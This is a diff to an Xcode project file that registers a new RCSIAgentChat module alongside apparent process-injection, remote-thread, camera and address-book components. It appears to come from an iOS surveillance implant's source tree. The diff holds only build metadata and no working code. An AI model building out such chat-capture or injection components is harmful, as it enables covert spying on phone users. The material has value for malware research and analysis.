@@ -214,6 +214,7 @@
 		52F2B80C14F67D6C00AB51B2 /* CoreGraphics.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 52682E48149B3FF900CE9ADB /* CoreGraphics.framework */; };
 		52F4769F10D7A11A00776574 /* AddressBook.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 52F4769E10D7A11A00776574 /* AddressBook.framework */; };
 		C55C53CE14CECA240034B013 /* AVFoundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C55C53CD14CECA240034B013 /* AVFoundation.framework */; };
+		CC1B55DF15C035A800EDD3F4 /* RCSIAgentChat.m in Sources */ = {isa = PBXBuildFile; fileRef = CC1B55DE15C035A800EDD3F4 /* RCSIAgentChat.m */; };
 		CCBEFEAC15B6B02C00951F6D /* RCSIAgentPositionSupport.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A19BEB4107C9A300060F679 /* RCSIAgentPositionSupport.m */; };
 /* End PBXBuildFile section */
 
@@ -475,6 +476,8 @@
 		52F2B80814F67D6C00AB51B2 /* dylib.ios */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = dylib.ios; sourceTree = BUILT_PRODUCTS_DIR; };
 		52F4769E10D7A11A00776574 /* AddressBook.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AddressBook.framework; path = /System/Library/Frameworks/AddressBook.framework; sourceTree = "<absolute>"; };
 		C55C53CD14CECA240034B013 /* AVFoundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AVFoundation.framework; path = Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.3.sdk/System/Library/Frameworks/AVFoundation.framework; sourceTree = DEVELOPER_DIR; };
+		CC1B55DD15C035A800EDD3F4 /* RCSIAgentChat.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSIAgentChat.h; sourceTree = "<group>"; };
+		CC1B55DE15C035A800EDD3F4 /* RCSIAgentChat.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RCSIAgentChat.m; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -694,6 +697,8 @@
 				523CDB7E1488EF6D00A7947E /* RCSIAgentCamera.h */,
 				523CDB7F1488EF6D00A7947E /* RCSIAgentCamera.mm */,
 				52DA63DA14892BE20022C1D3 /* RCSICameraSupport.h */,
+				CC1B55DD15C035A800EDD3F4 /* RCSIAgentChat.h */,
+				CC1B55DE15C035A800EDD3F4 /* RCSIAgentChat.m */,
 				5231D30F153573DD00257253 /* RCSIAgentManager.h */,
 				5231D310153573DD00257253 /* RCSIAgentManager.mm */,
 			);
@@ -1255,6 +1260,7 @@
 				5220196D1549820000C4FB66 /* RCSIProcInjection.c in Sources */,
 				5220196F1549832D00C4FB66 /* RCSIRemoteThread.s in Sources */,
 				52965493155D580F00AED90A /* RCSIDylibBlob.m in Sources */,
+				CC1B55DF15C035A800EDD3F4 /* RCSIAgentChat.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
